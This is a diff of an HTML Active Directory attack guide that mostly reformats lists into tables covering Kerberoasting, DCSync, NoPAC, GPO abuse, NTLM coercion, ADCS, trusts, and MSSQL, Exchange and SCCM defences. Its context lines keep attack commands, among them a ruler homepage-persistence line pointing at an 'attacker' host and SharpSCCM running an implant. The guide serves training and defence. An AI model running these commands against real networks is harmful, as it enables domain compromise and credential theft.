 <p>AS-REPRoasting targets accounts with Kerberos pre-authentication disabled (<code>DONT_REQUIRE_PREAUTH</code> UAC flag). When pre-auth is off, any principal can request a TGT for the target account and receive an AS-REP containing data encrypted with the account's password hash, which can be cracked offline.</p>
@@ -3028,10 +3082,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt</code></pre>
 
 <h5 id="cape-how-it-works-f47f93">Kerberoasting Mechanics</h5>
 <p>When a domain user sends a TGS-REQ for an SPN, the KDC returns a TGS-REP containing a service ticket encrypted with the target service account's secret key. The encryption type depends on the account's <code>msDS-SupportedEncryptionTypes</code> attribute:</p>
-<ul>
-<li><strong>RC4 (0x17)</strong>: uses the NTLM hash directly. Fast to crack</li>
-<li><strong>AES256 (0x12)</strong>: uses a key derived from the password with 4096 PBKDF2 iterations. Much slower to crack</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>RC4 (0x17)</td><td>uses the NTLM hash directly. Fast to crack</td></tr>
+<tr><td>AES256 (0x12)</td><td>uses a key derived from the password with 4096 PBKDF2 iterations. Much slower to crack</td></tr>
+</tbody>
+</table>
 <p>Service accounts running under computer accounts are less interesting because their passwords are 120+ character random strings that are infeasible to crack. The primary targets are user accounts with SPNs set, especially those with weak passwords.</p>
 
 <h5 id="cape-from-linux-40ffae">From Linux</h5>
@@ -3545,11 +3602,14 @@ kerbrute bruteuser --dc DC01.corp.local -d corp.local passwords.txt jsmith</code
 
 <h3 id="cape-dacl-fundamentals-c3a50d">7.1 DACL Fundamentals</h3>
 <p>Every securable object in Active Directory (users, groups, computers, OUs, GPOs) has a <strong>Security Descriptor</strong> containing:</p>
-<ul>
-<li><strong>DACL (Discretionary Access Control List)</strong>: ordered list of Access Control Entries (ACEs) that define who can do what</li>
-<li><strong>SACL (System Access Control List)</strong>: defines auditing rules (which access attempts generate security events)</li>
-<li><strong>Owner</strong>: the security principal that owns the object (owners can always modify the DACL)</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>DACL (Discretionary Access Control List)</td><td>ordered list of Access Control Entries (ACEs) that define who can do what</td></tr>
+<tr><td>SACL (System Access Control List)</td><td>defines auditing rules (which access attempts generate security events)</td></tr>
+<tr><td>Owner</td><td>the security principal that owns the object (owners can always modify the DACL)</td></tr>
+</tbody>
+</table>
 
 <figure><img src="./img/cape/acl-abuse-mindmap.png" style="max-width:420px" alt="ACL abuse attack paths mindmap"></figure>
 
@@ -3807,10 +3867,13 @@ bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local add generic
 
 <h5 id="cape-granting-dcsync-rights-92f3f0">Granting DCSync Rights</h5>
 <p>DCSync requires two specific extended rights on the domain object:</p>
-<ul>
-<li><strong>DS-Replication-Get-Changes</strong> (GUID: <code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code>)</li>
-<li><strong>DS-Replication-Get-Changes-All</strong> (GUID: <code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code>)</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>DS-Replication-Get-Changes (GUID</td><td><code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code>)</td></tr>
+<tr><td>DS-Replication-Get-Changes-All (GUID</td><td><code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code>)</td></tr>
+</tbody>
+</table>
 <pre><code class="language-powershell"># Grant DCSync rights via PowerView
 Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity currentuser -Rights DCSync
 
@@ -3867,11 +3930,16 @@ bloodyAD -d corp.local -u user -p 'Password1' --host DC01.corp.local add generic
 </table>
 
 <p>Detection strategies:</p>
+<table class="custom-table">
+<thead><tr><th>Event</th><th>Detection Focus</th></tr></thead>
+<tbody>
+<tr><td>Event ID 5136 (Directory Service Changes)</td><td>Monitor DACL modifications on sensitive objects such as Domain Admins, Domain Controllers OU, and the domain root</td></tr>
+<tr><td>Event ID 4662 (Operation on directory object)</td><td>Audit access to critical AD objects</td></tr>
+<tr><td>Event ID 4738 (User account changed)</td><td>Detect SPN modifications and password resets</td></tr>
+<tr><td>Event ID 4728/4732/4756 (Member added to security-enabled group)</td><td>Detect unauthorized group membership changes</td></tr>
+</tbody>
+</table>
 <ul>
-<li><strong>Event ID 5136</strong> (Directory Service Changes): monitor DACL modifications on sensitive objects (Domain Admins, Domain Controllers OU, domain root)</li>
-<li><strong>Event ID 4662</strong> (Operation on directory object): audit access to critical AD objects</li>
-<li><strong>Event ID 4738</strong> (User account changed): detect SPN modifications and password resets</li>
-<li><strong>Event ID 4728/4732/4756</strong> (Member added to security-enabled group): detect unauthorized group membership changes</li>
 <li>Use BloodHound regularly to identify and remediate dangerous ACL paths before attackers discover them</li>
 <li>Apply the principle of least privilege to all ACL assignments; remove unnecessary <code>GenericAll</code> and <code>WriteDacl</code> permissions</li>
 <li>Enable <strong>Advanced Security Audit Policy</strong> for Directory Service Access on all Domain Controllers</li>
@@ -4084,10 +4152,13 @@ python3 targetedKerberoast.py -d corp.local -u attacker -p 'Password123' --dc-ip
 <p>The NoPAC attack chain exploits CVE-2021-42278 and CVE-2021-42287 to impersonate any domain user, including Domain Admins, by manipulating the <code>sAMAccountName</code> attribute of a machine account. A standard domain user (with the default MachineAccountQuota of 10) can escalate to Domain Admin.</p>
 
 <h4 id="cape-cve-2021-42278-and-cve-2021-42287-4217a9">8.3.1 CVE-2021-42278 and CVE-2021-42287</h4>
-<ul>
-<li><strong>CVE-2021-42278</strong>: The KDC does not validate that a machine account's <code>sAMAccountName</code> ends with <code>$</code>. An attacker can rename a machine account to match a privileged user's sAMAccountName.</li>
-<li><strong>CVE-2021-42287</strong>: When the KDC cannot find the account named in a TGT during S4U2self, it appends <code>$</code> and searches again. If the original machine account has been renamed back, the KDC resolves the request against the target (e.g., the domain controller's machine account).</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>CVE-2021-42278</td><td>The KDC does not validate that a machine account's <code>sAMAccountName</code> ends with <code>$</code>. An attacker can rename a machine account to match a privileged user's sAMAccountName.</td></tr>
+<tr><td>CVE-2021-42287</td><td>When the KDC cannot find the account named in a TGT during S4U2self, it appends <code>$</code> and searches again. If the original machine account has been renamed back, the KDC resolves the request against the target (e.g., the domain controller's machine account).</td></tr>
+</tbody>
+</table>
 <p>Combined, an attacker creates a machine account, renames it to a DC's sAMAccountName (without the $), requests a TGT, renames the machine account back, then uses the TGT for S4U2self to obtain a service ticket as any user.</p>
 
 <h4 id="cape-machine-account-manipulation-3f9fa1">8.3.2 Machine Account Manipulation</h4>
@@ -4155,12 +4226,15 @@ noPac.exe -domain corp.local -user lowpriv -pass "Password123" /dc dc01.corp.loc
 <figure><img src="./img/cape/adalanche-graph.png" style="max-width:640px" alt="Adalanche graph showing AD relationships"></figure>
 
 <p>Key GPO concepts:</p>
-<ul>
-<li><strong>GPO Structure</strong>: Each GPO has two components: a <strong>Group Policy Container (GPC)</strong> stored in AD (CN=Policies in the System container) and a <strong>Group Policy Template (GPT)</strong> stored on SYSVOL as a folder named by the GPO's GUID</li>
-<li><strong>Processing Order</strong>: Local Policy, Site, Domain, OU (LSDOU). Policies applied later override earlier ones. <strong>Enforced</strong> GPOs override Block Inheritance.</li>
-<li><strong>Security Filtering</strong>: By default, GPOs apply to Authenticated Users. Security filtering can restrict application to specific groups or users.</li>
-<li><strong>WMI Filters</strong>: Additional conditions (OS version, hardware specs) that determine whether a GPO applies to a given computer</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>GPO Structure</td><td>Each GPO has two components: a <strong>Group Policy Container (GPC)</strong> stored in AD (CN=Policies in the System container) and a <strong>Group Policy Template (GPT)</strong> stored on SYSVOL as a folder named by the GPO's GUID</td></tr>
+<tr><td>Processing Order</td><td>Local Policy, Site, Domain, OU (LSDOU). Policies applied later override earlier ones. <strong>Enforced</strong> GPOs override Block Inheritance.</td></tr>
+<tr><td>Security Filtering</td><td>By default, GPOs apply to Authenticated Users. Security filtering can restrict application to specific groups or users.</td></tr>
+<tr><td>WMI Filters</td><td>Additional conditions (OS version, hardware specs) that determine whether a GPO applies to a given computer</td></tr>
+</tbody>
+</table>
 <pre><code class="language-powershell"># List all GPOs in the domain
 Get-GPO -All | Select-Object DisplayName, Id, GpoStatus
 
@@ -4277,13 +4351,16 @@ python3 pygpoabuse.py corp.local/attacker:'Password123' -gpo-id "AB12CD34-EF56-7
 </table>
 
 <p>Key mitigations:</p>
-<ul>
-<li><strong>Least privilege</strong>: audit and remove unnecessary write permissions on sensitive attributes (msDS-KeyCredentialLink, scriptPath, servicePrincipalName, sAMAccountName)</li>
-<li><strong>MachineAccountQuota = 0</strong>: prevent standard users from creating machine accounts</li>
-<li><strong>GPO audit</strong>: restrict GPO modification rights to dedicated admin groups; enable Advanced Audit Policy for Directory Service Changes</li>
-<li><strong>Patch management</strong>: apply NoPAC patches (KB5008102, KB5008380) promptly</li>
-<li><strong>Protected Users</strong>: enroll sensitive accounts in the Protected Users group to block NTLM and enforce Kerberos with AES</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Least privilege</td><td>audit and remove unnecessary write permissions on sensitive attributes (msDS-KeyCredentialLink, scriptPath, servicePrincipalName, sAMAccountName)</td></tr>
+<tr><td>MachineAccountQuota = 0</td><td>prevent standard users from creating machine accounts</td></tr>
+<tr><td>GPO audit</td><td>restrict GPO modification rights to dedicated admin groups; enable Advanced Audit Policy for Directory Service Changes</td></tr>
+<tr><td>Patch management</td><td>apply NoPAC patches (KB5008102, KB5008380) promptly</td></tr>
+<tr><td>Protected Users</td><td>enroll sensitive accounts in the Protected Users group to block NTLM and enforce Kerberos with AES</td></tr>
+</tbody>
+</table>
 
 <h2 id="cape-ntlm-relay-attacks-daff51">9. NTLM Relay Attacks</h2>
 <p>NTLM relay attacks intercept an NTLM authentication attempt and forward it to a different service, allowing the attacker to act as the victim on that service. Unlike hash capture, where the attacker cracks the hash offline, relay attacks use the live authentication session and do not require knowing the victim's password. Effective relay operations depend on NTLM protocol behavior, relay mechanics, poisoning techniques, and cross-protocol attack paths.</p>
@@ -4575,12 +4652,15 @@ $lnk.Save()</code></pre>
 
 <h5 id="cape-office-documents-0e1cbb">Office Documents</h5>
 <p>Microsoft Office documents can embed UNC references that trigger NTLM authentication when opened. Common techniques:</p>
-<ul>
-<li><strong>Linked images</strong>: Insert an image with a UNC path source</li>
-<li><strong>Template injection</strong>: Reference a remote .dotx template via UNC</li>
-<li><strong>OLE objects</strong>: Embed an OLE link to a UNC path</li>
-<li><strong>Excel web queries</strong>: .iqy files that point to UNC paths</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Linked images</td><td>Insert an image with a UNC path source</td></tr>
+<tr><td>Template injection</td><td>Reference a remote .dotx template via UNC</td></tr>
+<tr><td>OLE objects</td><td>Embed an OLE link to a UNC path</td></tr>
+<tr><td>Excel web queries</td><td>.iqy files that point to UNC paths</td></tr>
+</tbody>
+</table>
 
 <h4 id="cape-authentication-coercion-8f7657">9.4.3 Authentication Coercion</h4>
 <p>Authentication coercion forces a target machine (often a domain controller) to initiate NTLM authentication to an attacker-controlled host. Unlike hash farming (which relies on user interaction), coercion uses Windows RPC interfaces to trigger machine account authentication.</p>
@@ -4944,12 +5024,15 @@ certipy template -u user@corp.local -p 'Password123' -template TargetTemplate -c
 <h4 id="cape-esc5-vulnerable-pki-object-access-contro-a03b7d">10.4.1 ESC5: Vulnerable PKI Object Access Control</h4>
 <p>ESC5 targets the broader PKI objects in Active Directory rather than individual templates. If an attacker can modify the CA object, the <code>NTAuthCertificates</code> object, or other PKI-related objects in the Configuration Naming Context, they can compromise the entire PKI.</p>
 <p>Vulnerable objects include:</p>
-<ul>
-<li><strong>CA server computer object</strong>: compromising the CA host gives access to the CA private key</li>
-<li><strong>CA object in AD</strong> (<code>CN=Enrollment Services</code>): controls which templates the CA publishes</li>
-<li><strong>NTAuthCertificates object</strong>: defines which CAs are trusted for authentication; adding a rogue CA here enables forged certificate authentication</li>
-<li><strong>Enrollment Services container</strong>: managing this grants control over CA configuration in AD</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Object</th><th>Role</th></tr></thead>
+<tbody>
+<tr><td>CA server computer object</td><td>Compromising the CA host gives access to the CA private key</td></tr>
+<tr><td>CA object in AD (<code>CN=Enrollment Services</code>)</td><td>Controls which templates the CA publishes</td></tr>
+<tr><td>NTAuthCertificates object</td><td>Defines which CAs are trusted for authentication; adding a rogue CA here enables forged certificate authentication</td></tr>
+<tr><td>Enrollment Services container</td><td>Managing this grants control over CA configuration in AD</td></tr>
+</tbody>
+</table>
 <pre><code class="language-powershell"># Check ACLs on the CA object in AD
 Get-ADObject "CN=corp-DC01-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties nTSecurityDescriptor | Select-Object -ExpandProperty nTSecurityDescriptor | Select-Object -ExpandProperty Access</code></pre>
 
@@ -5169,13 +5252,16 @@ certipy find -u user@corp.local -p 'Password123' -dc-ip 10.10.10.10 -old-bloodho
 # Import the generated JSON files into BloodHound
 # Look for edges: CanEnroll, HasEnrollmentRights, IssuedSignedBy, EnterpriseCAFor, etc.</code></pre>
 <p>Key ADCS edges in BloodHound:</p>
-<ul>
-<li><strong>CanEnroll</strong>: principal has enrollment rights on a template</li>
-<li><strong>ADCSESC1 through ADCSESC10</strong>: specific escalation path edges</li>
-<li><strong>IssuedSignedBy</strong>: certificate chain relationships</li>
-<li><strong>EnterpriseCAFor</strong>: CA to domain relationships</li>
-<li><strong>RootCAFor / NTAuthStoreFor</strong>: trust anchor relationships</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>CanEnroll</td><td>principal has enrollment rights on a template</td></tr>
+<tr><td>ADCSESC1 through ADCSESC10</td><td>specific escalation path edges</td></tr>
+<tr><td>IssuedSignedBy</td><td>certificate chain relationships</td></tr>
+<tr><td>EnterpriseCAFor</td><td>CA to domain relationships</td></tr>
+<tr><td>RootCAFor / NTAuthStoreFor</td><td>trust anchor relationships</td></tr>
+</tbody>
+</table>
 
 <h4 id="cape-adcs-attack-summary-cdd84d">10.6.5 ADCS Attack Summary</h4>
 <table class="custom-table">
@@ -5591,11 +5677,14 @@ Get-DomainForeignGroupMember</code></pre>
 <h4 id="cape-abusing-pam-trusts-a565f0">11.5.1 Abusing PAM Trusts</h4>
 <p>Privileged Access Management (PAM) trusts are a special forest trust type introduced in Windows Server 2016. A PAM trust allows a "bastion" forest to manage privileged access in a "production" forest using shadow principals and time-bound group membership.</p>
 <p>Key concepts:</p>
-<ul>
-<li><strong>Bastion forest</strong>: a hardened, isolated forest that manages privileged access</li>
-<li><strong>Shadow principals</strong>: objects in the bastion forest that map to groups in the production forest</li>
-<li><strong>Time-bound membership</strong>: principals added to shadow groups receive time-limited membership via TTL-based links</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Bastion forest</td><td>a hardened, isolated forest that manages privileged access</td></tr>
+<tr><td>Shadow principals</td><td>objects in the bastion forest that map to groups in the production forest</td></tr>
+<tr><td>Time-bound membership</td><td>principals added to shadow groups receive time-limited membership via TTL-based links</td></tr>
+</tbody>
+</table>
 <p>Attack vectors:</p>
 <ul>
 <li>Compromising the bastion forest grants control over all shadow principals and their associated production forest privileges</li>
@@ -5610,15 +5699,18 @@ Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Confi
 
 <h4 id="cape-trust-attack-mitigations-and-detections-631eb8">11.5.2 Trust Attack Mitigations and Detections</h4>
 <p><strong>Mitigation strategies:</strong></p>
-<ul>
-<li><strong>SID filtering</strong>: ensure it is enabled on all inter-forest trusts; verify with <code>netdom trust /quarantine</code></li>
-<li><strong>Selective authentication</strong>: restrict which principals from the trusted forest can authenticate; set the <code>Allowed to Authenticate</code> permission on target resources</li>
-<li><strong>TGT delegation</strong>: disable <code>TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION</code> on forest trusts unless explicitly required</li>
-<li><strong>Tiered administration</strong>: do not share administrative credentials across trust boundaries; isolate Tier 0 assets</li>
-<li><strong>Minimize cross-forest group membership</strong>: audit FSPs and remove unnecessary cross-forest access</li>
-<li><strong>Protect krbtgt accounts</strong>: rotate the krbtgt password in all domains regularly (every 180 days minimum)</li>
-<li><strong>Audit SQL Server links</strong>: remove or restrict cross-forest linked servers; avoid using high-privilege service accounts</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>SID filtering</td><td>ensure it is enabled on all inter-forest trusts; verify with <code>netdom trust /quarantine</code></td></tr>
+<tr><td>Selective authentication</td><td>restrict which principals from the trusted forest can authenticate; set the <code>Allowed to Authenticate</code> permission on target resources</td></tr>
+<tr><td>TGT delegation</td><td>disable <code>TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION</code> on forest trusts unless explicitly required</td></tr>
+<tr><td>Tiered administration</td><td>do not share administrative credentials across trust boundaries; isolate Tier 0 assets</td></tr>
+<tr><td>Minimize cross-forest group membership</td><td>audit FSPs and remove unnecessary cross-forest access</td></tr>
+<tr><td>Protect krbtgt accounts</td><td>rotate the krbtgt password in all domains regularly (every 180 days minimum)</td></tr>
+<tr><td>Audit SQL Server links</td><td>remove or restrict cross-forest linked servers; avoid using high-privilege service accounts</td></tr>
+</tbody>
+</table>
 <p><strong>Detection opportunities:</strong></p>
 <table class="custom-table">
 <thead><tr><th>Event</th><th>Event ID</th><th>What to Monitor</th></tr></thead>
@@ -6926,15 +7018,18 @@ execute-assembly /opt/tools/PowerUpSQL.dll ; Get-SQLServerInfo -Instance SQL01
 execute-assembly /opt/tools/PowerUpSQL.dll ; Invoke-SQLAudit -Instance SQL01</code></pre>
 
 <h4 id="cape-mssql-defensive-considerations-b6531d">14.1.6 MSSQL Defensive Considerations</h4>
-<ul>
-<li><strong>Principle of least privilege</strong>: avoid granting sysadmin; use granular database roles</li>
-<li><strong>Disable xp_cmdshell</strong>: disable and monitor for re-enablement via sp_configure changes</li>
-<li><strong>Remove unnecessary linked servers</strong>: each link expands the attack surface</li>
-<li><strong>Use Group Managed Service Accounts (gMSA)</strong>: auto-rotated credentials for SQL service accounts</li>
-<li><strong>Enable SQL Server Audit</strong>: log login attempts, privilege changes, and command execution</li>
-<li><strong>Restrict OLE Automation and CLR</strong>: disable unless explicitly required</li>
-<li><strong>Network segmentation</strong>: restrict SQL Server access to application servers only</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Principle of least privilege</td><td>avoid granting sysadmin; use granular database roles</td></tr>
+<tr><td>Disable xp_cmdshell</td><td>disable and monitor for re-enablement via sp_configure changes</td></tr>
+<tr><td>Remove unnecessary linked servers</td><td>each link expands the attack surface</td></tr>
+<tr><td>Use Group Managed Service Accounts (gMSA)</td><td>auto-rotated credentials for SQL service accounts</td></tr>
+<tr><td>Enable SQL Server Audit</td><td>log login attempts, privilege changes, and command execution</td></tr>
+<tr><td>Restrict OLE Automation and CLR</td><td>disable unless explicitly required</td></tr>
+<tr><td>Network segmentation</td><td>restrict SQL Server access to application servers only</td></tr>
+</tbody>
+</table>
 
 
 <h4 id="cape-mssql-server-attacks-7777a4-methodology">Methodology</h4>
@@ -6975,13 +7070,16 @@ execute-assembly /opt/tools/PowerUpSQL.dll ; Get-SQLServerLinkCrawl -Instance SQ
 <p>Microsoft Exchange Server manages email, calendaring, and collaboration within organizations. Exchange integrates deeply with Active Directory, storing mailbox data and configuration in AD objects. Key components:</p>
 <h4 id="cape-introduction-to-exchange-5a35a2">14.2.1 Introduction to Exchange</h4>
 <p>Microsoft Exchange Server manages email, calendaring, and collaboration within organizations. Exchange integrates deeply with Active Directory, storing mailbox data and configuration in AD objects. Key components:</p>
-<ul>
-<li><strong>Outlook Web Access (OWA)</strong>: browser-based email access</li>
-<li><strong>Exchange Web Services (EWS)</strong>: SOAP-based API for programmatic access</li>
-<li><strong>AutoDiscover</strong>: automatic client configuration endpoint</li>
-<li><strong>Exchange Admin Center (EAC)</strong>: web-based administration console</li>
-<li><strong>Exchange Management Shell (EMS)</strong>: PowerShell-based administration</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Outlook Web Access (OWA)</td><td>browser-based email access</td></tr>
+<tr><td>Exchange Web Services (EWS)</td><td>SOAP-based API for programmatic access</td></tr>
+<tr><td>AutoDiscover</td><td>automatic client configuration endpoint</td></tr>
+<tr><td>Exchange Admin Center (EAC)</td><td>web-based administration console</td></tr>
+<tr><td>Exchange Management Shell (EMS)</td><td>PowerShell-based administration</td></tr>
+</tbody>
+</table>
 
 <h4 id="cape-exchange-enumeration-00d053">14.2.2 Exchange Enumeration</h4>
 <pre><code class="language-bash"># Discover Exchange servers via DNS
@@ -7028,14 +7126,17 @@ ruler -u user@corp.local -p 'P@ssw0rd' --email user@corp.local display
 ruler -u user@corp.local -p 'P@ssw0rd' --email user@corp.local homepage add --url http://attacker/payload.html</code></pre>
 
 <h4 id="cape-exchange-defensive-considerations-3fc42b">14.2.5 Exchange Defensive Considerations</h4>
-<ul>
-<li><strong>Patch promptly</strong>: Exchange vulnerabilities are frequently exploited within days of disclosure</li>
-<li><strong>Restrict OWA/ECP exposure</strong>: limit access to internal networks or VPN connections</li>
-<li><strong>Disable legacy protocols</strong>: MAPI/RPC, POP3, IMAP unless required</li>
-<li><strong>Monitor mailbox rules</strong>: detect suspicious forwarding rules and homepage persistence</li>
-<li><strong>Segment Exchange servers</strong>: restrict network access to required ports only</li>
-<li><strong>Review Exchange permissions in AD</strong>: Exchange groups have powerful default AD rights</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Patch promptly</td><td>Exchange vulnerabilities are frequently exploited within days of disclosure</td></tr>
+<tr><td>Restrict OWA/ECP exposure</td><td>limit access to internal networks or VPN connections</td></tr>
+<tr><td>Disable legacy protocols</td><td>MAPI/RPC, POP3, IMAP unless required</td></tr>
+<tr><td>Monitor mailbox rules</td><td>detect suspicious forwarding rules and homepage persistence</td></tr>
+<tr><td>Segment Exchange servers</td><td>restrict network access to required ports only</td></tr>
+<tr><td>Review Exchange permissions in AD</td><td>Exchange groups have powerful default AD rights</td></tr>
+</tbody>
+</table>
 
 
 <h4 id="cape-exchange-server-attacks-cdb660-methodology">Methodology</h4>
@@ -7068,14 +7169,17 @@ nslookup -type=srv _autodiscover._tcp.corp.local</code></pre>
 <p>System Center Configuration Manager (SCCM), now Microsoft Endpoint Configuration Manager (MECM), manages software deployment, patching, and configuration across enterprise Windows environments. Its architecture creates privileged attack paths:</p>
 <h4 id="cape-introduction-to-sccm-1e43e8">14.3.1 Introduction to SCCM</h4>
 <p>System Center Configuration Manager (SCCM), now Microsoft Endpoint Configuration Manager (MECM), manages software deployment, patching, and configuration across enterprise Windows environments. Its architecture creates privileged attack paths:</p>
-<ul>
-<li><strong>Site Server</strong>: central management point; runs the SMS Provider</li>
-<li><strong>Management Point (MP)</strong>: client-facing communication endpoint</li>
-<li><strong>Distribution Point (DP)</strong>: hosts content packages for client deployment</li>
-<li><strong>Site Database</strong>: MSSQL database storing all configuration and inventory data</li>
-<li><strong>SCCM Client</strong>: agent installed on managed endpoints</li>
-<li><strong>Network Access Account (NAA)</strong>: domain account used by clients to access distribution points</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Site Server</td><td>central management point; runs the SMS Provider</td></tr>
+<tr><td>Management Point (MP)</td><td>client-facing communication endpoint</td></tr>
+<tr><td>Distribution Point (DP)</td><td>hosts content packages for client deployment</td></tr>
+<tr><td>Site Database</td><td>MSSQL database storing all configuration and inventory data</td></tr>
+<tr><td>SCCM Client</td><td>agent installed on managed endpoints</td></tr>
+<tr><td>Network Access Account (NAA)</td><td>domain account used by clients to access distribution points</td></tr>
+</tbody>
+</table>
 
 <h4 id="cape-sccm-auditing-and-enumeration-fa85aa">14.3.2 SCCM Auditing and Enumeration</h4>
 <pre><code class="language-bash"># Discover SCCM infrastructure
@@ -7173,16 +7277,19 @@ execute-assembly /opt/tools/SharpSCCM.exe ; exec -p "C:\Windows\Temp\implant.exe
 # Extract from the site database or intercept during client push</code></pre>
 
 <h4 id="cape-sccm-defensive-considerations-f27d17">14.4.4 SCCM Defensive Considerations</h4>
-<ul>
-<li><strong>Require HTTPS for all client communication</strong>: prevents credential interception</li>
-<li><strong>Remove the NAA</strong>: use Enhanced HTTP or a PKI-based approach instead</li>
-<li><strong>Restrict site server permissions</strong>: minimize accounts with Full Administrator</li>
-<li><strong>Enable Kerberos-only authentication for the site database</strong>: prevents NTLM relay</li>
-<li><strong>Monitor SCCM admin activity</strong>: audit application deployments, script execution, and admin changes</li>
-<li><strong>Harden the site database</strong>: restrict access to the MSSQL instance hosting CM_ database</li>
-<li><strong>Segment SCCM infrastructure</strong>: site servers, management points, and databases on restricted networks</li>
-<li><strong>Review SCCM with Misconfiguration Manager</strong>: open-source SCCM attack and defense resource</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Item</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Require HTTPS for all client communication</td><td>prevents credential interception</td></tr>
+<tr><td>Remove the NAA</td><td>use Enhanced HTTP or a PKI-based approach instead</td></tr>
+<tr><td>Restrict site server permissions</td><td>minimize accounts with Full Administrator</td></tr>
+<tr><td>Enable Kerberos-only authentication for the site database</td><td>prevents NTLM relay</td></tr>
+<tr><td>Monitor SCCM admin activity</td><td>audit application deployments, script execution, and admin changes</td></tr>
+<tr><td>Harden the site database</td><td>restrict access to the MSSQL instance hosting CM_ database</td></tr>
+<tr><td>Segment SCCM infrastructure</td><td>site servers, management points, and databases on restricted networks</td></tr>
+<tr><td>Review SCCM with Misconfiguration Manager</td><td>open-source SCCM attack and defense resource</td></tr>
+</tbody>
+</table>
 
 
 <h4 id="cape-sccm-site-takeover-and-post-exploitation-32dc29-methodology">Methodology</h4>
